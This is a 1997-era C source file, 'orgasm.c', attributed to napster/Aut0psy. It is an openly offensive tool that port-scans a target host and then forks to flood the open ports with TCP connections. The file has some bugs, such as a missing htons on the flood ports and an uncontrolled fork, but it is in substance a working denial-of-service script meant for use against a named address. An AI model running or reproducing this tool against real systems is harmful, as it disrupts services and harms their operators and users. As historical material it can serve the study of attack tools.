
/* orgasm.c. by napster/Aut0psy 
 * Werdup to Aut0psy the master debugger/fixer wh0re.
 * portscans then floods the fark out of the person... 
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <netdb.h>

#define MAX                      1024
#define VERSION             "1.0 pre"

/* Prototypes */

unsigned int orgasm_resolve(char *host);
void pscan(unsigned int orgasm_resolved_host, int portlow, int porthigh, int hitport[]);

void orgasm_reseed(void);

void orgasm_usage(char *progname) {
  printf("orgasm.c by napster %s...\n", VERSION);
  printf("orgasm_usage: %s <address> <portlow> <porthigh> <# connex>\n",progname);
  exit(-1);
}
int a = 1;

orgasm_main(int argc, char *argv[]) {
  unsigned int orgasm_resolved_host;
  struct sockaddr_in sin[MAX];
  int x, y, q, sdesc[MAX];
  int portlow, porthigh, connex;
  int hitport[1024];

  if (argc < 5 || argc > 5) orgasm_usage(argv[0]);

  orgasm_reseed();

  orgasm_resolved_host = orgasm_resolve(argv[1]);    
  portlow  = atoi(argv[2]);
  porthigh = atoi(argv[3]);
  connex   = atoi(argv[4]);
	      
  system("clear");
  printf("                         orgasm.c by napster %s\n", VERSION);
  printf("                                 [1.28.97]\n\n");
  printf("Target address: %s\n", argv[1]);
  printf("Port scanning target...\n");
  sleep(1);
  printf("Ports open:");
  pscan(orgasm_resolved_host, portlow, porthigh, hitport);
  printf("\nPort info complete, flooding ports.\n");

  for (x=1;x<a;x++) {
    fork();
    for (q=1;q<=connex;q++) {
      /* Create Socket */
      sdesc[q] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

      /* Fill in Socket Endpoint */
      sin[q].sin_family = AF_INET;
      sin[q].sin_port = hitport[x];
      printf("%d hit\n", hitport[x]);
      sin[q].sin_addr.s_addr = orgasm_resolved_host;

      /* Connect to dest host. */
      connect(sdesc[q], (struct sockaddr *)&sin[q], sizeof(sin[q]));
    }
  }
}

void pscan(unsigned int orgasm_resolved_host, int portlow, int porthigh, int hitport[]) {
  int z, sockdesc;
  struct sockaddr_in sin;
	
  orgasm_reseed();
	
  for(z=portlow;z<=porthigh;z++) {		
    /* z counts from the port low to the port high for scanning */
    fflush(stdout);
    sockdesc = socket(AF_INET, SOCK_STREAM, 0);
		
    sin.sin_family = AF_INET;
    sin.sin_port = htons(z);
    sin.sin_addr.s_addr = orgasm_resolved_host;
  
    if (connect(sockdesc, (struct sockaddr *)&sin, sizeof(sin)) == 0) {
      printf(" %d", z);
      hitport[a] = z;	
      /* In total, a should represent the number of ports open */
      a++;
    }
  }
}

unsigned int orgasm_resolve(char *host) {
  /* orgasm_resolve routine written by Aut0psy. */

  struct hostent *he;
  struct sockaddr_in tmp;

  /* Lookup host. */
  he = gethostbyname(host);

  if (he) {
    /* Copy host into a temporary endpoint. */
    memcpy((caddr_t)&tmp.sin_addr.s_addr, he->h_addr, he->h_length);
    } 
  else {
    perror("resolving");
    exit(-1);
    }

  /* Return address in network byte order. */  
  return(tmp.sin_addr.s_addr);
}


void orgasm_reseed(void) {
  /* Seed random number database based on time of day... */
  srand(time(NULL));
}

